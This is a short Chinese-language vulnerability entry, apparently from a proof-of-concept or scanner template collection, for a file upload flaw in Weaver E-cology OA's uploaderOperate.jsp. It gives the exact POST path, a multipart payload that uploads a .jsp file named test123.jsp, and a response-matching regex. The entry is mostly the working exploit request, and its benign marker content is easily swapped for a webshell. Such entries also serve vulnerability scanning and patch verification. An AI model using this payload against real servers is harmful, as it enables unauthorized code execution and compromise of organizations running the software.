# 泛微E-cologyuploaderOperate.jsp存在文件上传漏洞

泛微OA ｜ 文件上传 ｜ —
- **请求**：`POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1`

**Payload**
```
--5bade36e1ef037ba47f545fe80bed819
Content-Disposition: form-data; name="secId"; filename=""
1
--5bade36e1ef037ba47f545fe80bed819
Content-Disposition: form-data; name="Filedata"; filename="test123.jsp"
dude
--5bade36e1ef037ba47f545fe80bed819
Content-Disposition: form-data; name="plandetailid"; filename=""
1
--5bade36e1ef037ba47f545fe80bed819--
```
- **响应特征**：-1 ^(?=.*?(?:btn_wh|test123.jsp)).*?$